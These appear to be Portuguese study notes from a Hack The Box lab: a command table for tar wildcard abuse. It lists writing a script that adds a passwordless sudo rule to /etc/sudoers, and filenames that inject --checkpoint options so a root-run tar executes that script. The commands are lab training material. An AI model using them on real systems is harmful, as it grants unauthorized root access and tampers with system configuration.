# Comandos Principais - Wildcard Abuse

| Comando | Objetivo | Resultado esperado |
|---|---|---|
| `man tar` | Ver opções exploráveis do `tar` | Identificação de `--checkpoint` e `--checkpoint-action` |
| `echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh` | Criar script que adiciona privilégio sudo sem senha | Arquivo `root.sh` malicioso criado |
| `echo "" > "--checkpoint-action=exec=sh root.sh"` | Criar arquivo que injeta opção de execução no `tar` | Argumento malicioso para executar `root.sh` |
| `echo "" > --checkpoint=1` | Criar arquivo que força checkpoint imediato | `tar` processa a ação no checkpoint |
| `ls -la` | Confirmar criação dos arquivos de abuso | Arquivos `--checkpoint*` e `root.sh` visíveis |
| `sudo -l` | Verificar se privilégios foram elevados | Usuário com `(root) NOPASSWD: ALL` |

